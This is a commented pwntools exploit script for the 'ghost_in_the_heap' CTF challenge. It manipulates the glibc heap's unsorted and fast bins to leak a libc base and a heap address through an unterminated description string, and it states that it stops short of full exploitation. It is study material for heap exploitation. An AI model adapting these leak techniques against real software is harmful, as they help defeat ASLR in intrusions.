#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', aslr=True, terminal=['tmux', 'neww'])
env = {
    # 'LD_PRELOAD': './libc.so.6'
}

if args['GDB']:
    io = gdb.debug(
        './ghost_in_the_heap.bin',
        env=env,
        gdbscript='''\
        set follow-fork-mode parent
        c
    ''')
    elf, libc = io.elf, io.libc
else:
    io = process('./ghost_in_the_heap.bin', env=env)
    elf, libc = io.elf, io.libc

# thanks to https://github.com/scwuaptx/CTF/tree/master/2017-writeup/hitcon/ghost_in_the_heap

# this exploit is incomplete! we only leak the address of libc and an address from the heap

# part 1: leaking a heap address and finding the base address of libc

# the "Add ghost" functionality allocates a ghost on the heap, i.e. a struct containing
# a description and a magic number both supplied by the user
# the "Watch ghost" functionality just prints the description of the ghost
# if the supplied description does not end with a newline, no null terminator is appended
# to the string: printing the description will result in a data leak from the heap

# we want to leak both an address of libc and an address of the heap
# how can we do it? we need to find a way to allocate the ghost in any part
# of the heap which contained (before the allocation) a free chunk linked in the unsorted bin
# in this way, we can leak, for example, the back pointer to the previous chunk (which is either
# an address of libc or an address of the heap)


def new_heap(data):
    io.recvuntil('Your choice: ')
    io.sendline('1')
    io.recvuntil('Data :')
    io.sendline(data)


def delete_heap(index):
    io.recvuntil('Your choice: ')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(index))


def add_ghost(magic, description):
    io.recvuntil('Your choice: ')
    io.sendline('3')
    io.recvuntil('Magic :')
    io.sendline(str(magic))
    io.recvuntil('Description :')
    io.send(description)
    sleep(0.2)


def remove_ghost():
    io.recvuntil('Your choice: ')
    io.sendline('5')


# to leak an address of libc, we need to:

# 1. allocate heap 0 and heap 1
new_heap('A' * 167)
new_heap('B' * 167)
# A | heap 0 |
# B | heap 1 |
#   | top |

# 2. deallocate heap 0 (whose chunk will go in the unsorted bin)
delete_heap(0)
# A | free (unsorted bin) |
# B | heap 1 |
#   | top |

# 3. add the ghost and read its description to leak a back pointer in the unsorted bin
magic = 0x1337
description = 'AAAAAAAAA'
add_ghost(magic, description)
# A | ghost |
#   | free (unsorted bin) |
# B | heap 1 |
#   | top |
io.recvuntil('Your choice: ')
io.sendline('4')
io.recvuntil('Magic :')
io.sendline(str(magic))
io.recvuntil('Description: ')
io.recvuntil(description)
a_libc_address = u64(('\x00' + io.recvn(5)).ljust(8, '\x00'))
if not env:
    libc.address = a_libc_address - (0x7f2d9c26ab00 - 0x7f2d9bea9000)
else:
    raise NotImplementedError
success('libc.address: %s' % hex(libc.address))

# reset the state of the heap
remove_ghost()
delete_heap(1)

# to leak an address of the heap we need to perform more steps, since to contain
# an address of the heap the unsorted bin must contain at least two chunks

# to make the unsorted bin containing two chunks, we need to:

# 1. allocate the ghost and three "heaps" (it's a misleading name, but it's what
# the challenge uses—they are just data on the heap)
add_ghost(0x1337, 'D')
new_heap('A' * 167)
new_heap('B' * 167)
new_heap('C' * 167)
# heap layout:
# | ghost |
# | heap 0 |
# | heap 1 |
# | heap 2 |
# | top |

# 2. deallocate the ghost (whose chunk will go in the fast bin) and heap 0 (whose chunk
# will go in the unsorted bin)
remove_ghost()
delete_heap(0)
# | free (fast bin) |
# | free (unsorted bin) |
# | heap 1 |
# | heap 2 |
# | top |

# 3. deallocate heap 2 (to trigger a consolidate for merging the free chunk in the fast bin
# and the free chunk in the unsorted bin into a single "big" free chunk in the unsorted bin)
delete_heap(2)
# A | "big" free (unsorted bin) |
# B | heap 1 |
#   | top |

# 4. reallocate heap 0 (to split in two the "big" free chunk in the unsorted bin) and heap 2
new_heap('a' * 167)
new_heap('c' * 167)
# A | heap 0 |
# B | free (small bin) |
#   | heap 1 |
# C | heap 2 |
#   | top |

# 4. deallocate heap 1 (to merge it with the free chunk in the small bin
# into a single "big" free chunk)
delete_heap(1)
# A | heap 0 |
# B | "big" free (unsorted bin) |
# C | heap 2 |
#   | top |

# 5. reallocate heap 1 and remove heap 0 (to finally have two chunks in the unsorted bin)
new_heap('b' * 167)
delete_heap(0)
# A | free (unsorted bin) |
# B | heap 1 |
#   | free (unsorted bin) |
# C | heap 2 |
#   | top |

# now, add the ghost and read its description to leak an address from the heap
magic = 0x1337
description = 'AAAAAAAAA'
add_ghost(magic, description)
# A | ghost |
#   | free (unsorted bin) |
# B | heap 1 |
#   | free (unsorted bin) |
# C | heap 2 |
#   | top |
io.recvuntil('Your choice: ')
io.sendline('4')
io.recvuntil('Magic :')
io.sendline(str(magic))
io.recvuntil('Description: ')
io.recvuntil(description)
a_heap_address = u64(('\x00' + io.recvn(5)).ljust(8, '\x00'))
success('a_heap_address: %s' % hex(a_heap_address))
